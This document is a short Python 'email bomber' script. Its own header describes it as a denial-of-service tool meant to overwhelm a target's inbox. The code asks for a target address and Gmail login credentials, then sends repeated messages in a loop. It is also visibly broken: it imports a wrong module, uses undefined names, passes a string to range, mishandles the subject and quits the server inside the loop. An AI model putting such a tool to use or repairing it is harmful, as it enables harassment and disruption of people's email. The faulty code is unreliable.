'''
Email Bombing
📍 Phase: Disruption / Denial-of-Service (DoS)

This is technically outside traditional pentest scope

It’s more aligned with Red Team / Offensive Ops or troll-level DoS

Not a legit recon/exploit method — just meant to overwhelm inboxes

'''


import smtp

def mail_bomber():
    s("clear")
    print(logo + fa.BOLD)
    print(fa.BOLD + """\n
                    +========================================+
                    |..........[◉] Email Bomber [◉]..........|
                    +========================================+\n\n""")
    to = input('\n[◉] Target Mail address : ')
    user = input('\n[◉] Sender Email : ')
    passwd = getpass.getpass('\n[◉] Password : ')
    subject = input('Subject: ')
    body = input('\n[◉] Message : ')
    total = input('\n[◉] Number of send : ')
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, passwd)
        for i in range(1, total+1):
            subject = os.urandom(9)
            msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
            server.sendmail(user, to, msg)
            print("\r[✔] E-mails sent: %i" % i)
            sys.stdout.flush()
            server.quit()
            print('\n[✔] Done [✔] !!!')
    except smtplib.SMTPServerDisconnected:
        server
    except smtplib.SMTPAuthenticationError:
        print('\n[✘] The username or password you entered is incorrect.')
        sys.exit()
